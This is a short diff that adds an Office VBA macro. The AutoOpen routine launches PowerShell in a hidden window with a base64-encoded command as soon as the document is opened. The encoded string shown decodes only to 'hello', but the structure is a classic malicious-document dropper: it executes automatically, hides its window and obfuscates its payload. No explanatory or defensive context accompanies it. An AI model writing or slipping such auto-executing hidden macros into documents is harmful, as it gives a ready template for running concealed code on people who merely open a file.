@@ -1,0 +1,3 @@
+Sub AutoOpen()
+    Shell "powershell -nop -w hidden -enc aGVsbG8="
+End Sub
